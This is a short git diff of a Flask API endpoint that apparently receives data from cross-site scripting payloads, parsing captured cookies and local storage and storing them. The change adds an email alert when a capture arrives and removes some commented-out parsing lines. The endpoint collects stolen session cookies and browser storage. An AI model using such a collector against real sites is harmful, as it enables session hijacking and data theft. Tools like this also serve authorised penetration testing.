@@ -1,8 +1,9 @@
 from flask import jsonify, request
 from app import db
-from app.models import Client, XSS
+from app.models import Client, XSS, Settings
 from app.api import bp
 from flask_headers import headers
+from app.utils import send_mail
 
 import json
 import time
@@ -48,9 +49,6 @@ def catch_xss(flavor, uid):
                     cookie_array = cookie.split('=')
                     cookie_name = cookie_array[0]
                     cookie_value = ''.join(cookie_array[1:])
-                    # for element in cookie_array[1:]:
-                    #    cookie_value += element
-                    #cookie_name, cookie_value = cookie.split('=')
                     data['cookies'].append({cookie_name: cookie_value})
 
         elif param == 'local_storage':
@@ -81,5 +79,10 @@ def catch_xss(flavor, uid):
               xss_type=xss_type, data=json.dumps(data), timestamp=int(time.time()))
     db.session.add(xss)
     db.session.commit()
+
+    settings = Settings.query.first()
+
+    if xss.client.mail_to != None and settings.smtp_host != None:
+        send_mail(xss)
 
     return jsonify({'status': 'OK'}), 200
